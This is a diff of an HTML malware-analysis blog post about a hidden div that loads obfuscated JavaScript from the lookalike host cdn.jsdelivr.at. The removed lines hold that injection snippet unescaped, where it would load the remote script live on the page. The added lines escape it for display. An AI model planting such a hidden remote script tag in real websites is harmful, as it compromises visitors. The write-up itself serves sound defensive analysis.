@@ -9,9 +9,9 @@
 	<p>This script was not only obfuscated but exhibited some suspicious behavior, setting off alarm bells within our team. Its complexity and the mysterious nature piqued our curiosity, and we decided to delve deeper, to unravel the enigma of what this script was truly up to.</p>
 	<p>In our quest to decipher the script's purpose, we geared up to dissect its layers, determined to shed light on its hidden intentions and understand the full scope of its actions.</p>
 	<p>The Infection Mechanism: A seemingly harmless HTML <code>div</code> element housed a piece of JavaScript, a trojan horse lying in wait.</p>
-	<pre class="language-bash"><code class="language-bash"><div style="display: none; visibility: hidden;">
-<script src="//cdn.jsdelivr.at/js/sidebar.min.js"></script>
-</div></code></pre>
+	<pre class="language-bash"><code class="language-bash">&lt;div style="display: none; visibility: hidden;"&gt;
+&lt;script src="//cdn.jsdelivr.at/js/sidebar.min.js"&gt;&lt;/script&gt;
+&lt;/div&gt;</code></pre>
 	<p><i>The script was the conduit for the malicious activities</i></p>
 	<h2>The devil in the details</h2>
 	<p>The script hosted at the aforementioned domain was a piece of obfuscated JavaScript, a common tactic used by attackers to hide their malicious intent from casual observation. The obfuscated code can be examined in detail through the <a href="https://radar.cloudflare.com/scan/6cc5856d-f16d-496d-bfe0-f635bd75bec8/summary">snapshot</a> provided by Cloudflare Radar URL Scanner.</p>
